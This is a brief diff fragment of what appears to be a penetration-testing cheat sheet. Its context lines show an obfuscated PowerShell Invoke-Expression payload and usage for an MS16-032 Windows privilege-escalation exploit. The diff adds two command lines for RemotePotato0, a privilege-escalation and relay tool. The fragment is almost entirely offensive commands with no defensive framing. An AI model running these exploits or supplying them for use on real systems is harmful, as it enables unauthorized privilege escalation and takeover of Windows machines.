@@ -29,3 +29,6 @@ INVOkE-exprESSion( ( [Runtime.INTEroPseRViCes.maRshaL]::([RuntImE.iNTErOpSErvICe
  
 
 Usage: MS16_032.exe calc.exe OR MS16_032.exe cmd.exe \"/c clac.exe\"
+
+RemotePotato0.exe -m 2 -s 1
+RemotePotato0.exe -m 3 -l 9997
